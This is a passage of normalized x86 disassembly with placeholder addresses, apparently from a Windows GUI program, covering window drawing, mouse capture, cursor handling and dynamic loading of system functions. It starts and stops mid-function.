retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x48 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov edx [ ebp - 0x8 ]
add [ edx + 0x20 ] eax
sub_438e34
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_434714
mov edx eax
mov eax [ rw-data ]
call sub_439a14
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_434714
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
push 0x412
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
push eax
call GetDCEx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x58 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x54 ] edx
mov eax [ ebp - 0x4 ]
call sub_438fbc
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_438eb0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ rw-data ]
call sub_439a14
mov eax [ ebp - 0x4 ]
call sub_438fbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x50 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x60 ]
mov [ edx + 0x20 ] eax
adc eax 0x0
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x54 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x60 ]
mov [ edx + 0x20 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_438d98
mov eax [ ebp - 0x4 ]
push eax
push sub_438f98
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4371a8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
pop ecx
pop ebp
retn
sub_438f60
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43284c
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_438f98
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4371a8
sub_438f98
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_436cfc
sub_438fbc
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
call sub_436968
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x50 ]
sub edx eax
mov [ ebp - 0x18 ] edx
mov edx 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
call sub_436968
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0xc ]
mov [ ebp - 0x10 ] eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
call sub_436a04
add eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x54 ]
sub edx eax
mov [ ebp - 0x14 ] edx
mov edx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
call sub_436a04
add eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_40f3c0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
push eax
call SelectObject
mov [ ebp - 0x8 ] eax
push r--data
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
push eax
call PatBlt
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
push eax
call SelectObject
sub_4390d4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_439100
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_439100
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
jge r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_439100
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
call sub_4390d4
pop ecx
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
sub_4391ac
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4368f0
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_439100
pop ecx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_439200
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_42c198
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
call sub_42c198
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x28 ]
jg r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x2c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jge r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x20 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x24 ]
jge r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x24 ]
jl r-xdata
cmp eax [ ebp - 0x18 ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jl r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
sub_439288
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_437120
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
call sub_43b77c
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_437bc4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
push eax
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_439200
pop ecx
mov ecx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
jmp r-xdata
sub_439318
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
mov edx 0x2
call sub_436968
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x50 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
mov edx 0x1
call sub_436968
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x54 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4391ac
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x50 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x50 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4391ac
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x54 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x54 ] edx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x50 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x54 ] edx
jmp r-xdata
sub_439410
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_439865
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_444534
lea edx [ ebp - 0x50 ]
lea ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_437bc4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_438eb0
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_444534
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_437bc4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x50 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_42c3e4
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
cmp [ ebp - 0x1c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43986c
lea eax [ ebp - 0x54 ]
call sub_44cae0
retn
lea ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x1c ] 0x12
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x1c ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_434714
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_42ac08
push 0x1
xor ecx ecx
xor edx edx
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
call sub_42d9ac
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
add eax 0x38
call sub_44cae0
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_439288
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43292c
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_438fbc
lea edx [ ebp - 0x50 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_444534
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x50 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x4c ]
mov [ eax + 0x54 ] edx
push ebp
call sub_439318
pop ecx
mov eax [ ebp - 0x4 ]
call sub_438fbc
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_444534
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_437bc4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
call sub_42c838
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
call sub_42135c
jmp r-xdata
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_437bc4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x1c ] 0x12
jne r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x10 ]
call sub_42c198
lea ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx ]
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x2c ]
sub edx [ eax + 0x30 ]
mov eax edx
add eax eax
sub [ ebp - 0x2c ] eax
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x28 ]
sub edx [ eax + 0x34 ]
mov eax edx
add eax eax
sub [ ebp - 0x28 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x2c ]
sub eax edx
add eax eax
sub [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x28 ]
sub eax edx
add eax eax
sub [ ebp - 0x20 ] eax
lea edx [ ebp - 0x54 ]
mov eax [ ebp - 0x10 ]
call sub_42c9ec
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
add eax 0x38
call sub_44cb34
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x2c ]
mov ecx 0x4
[ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x1c ] 0x12
jne r-xdata
cmp [ ebp - 0x1c ] 0x2
jne r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_438e34
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_422d64
push eax
call SetCursor
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_434714
push eax
lea eax [ ebp - 0x48 ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8b ] 0x1
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x4d ] 0x1
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
or ecx 0xffffffff
xor edx edx
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
call sub_42d320
jmp r-xdata
sub_439874
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0xd ] al
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_439a48
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_439918
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_439a14
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43996c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
neg eax
sbb eax eax
neg eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] al
pop ecx
pop ebp
retn
sub_439990
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
neg eax
sbb eax eax
neg eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
add eax 0x10
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_4399cc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x10
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x24 ]
mov eax [ ebp - 0x4 ]
add eax 0x1c
call sub_4445d0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c ] 0x0
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] al
pop ecx
pop ecx
pop ebp
retn
sub_439a14
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_439954
cmp eax [ ebp - 0x8 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_439a48
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
sub eax 0x1
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_43996c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
sub eax 0x67
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_439990
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4399cc
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
add eax 0x10
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_439ad0
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_439c3b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_439d3c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
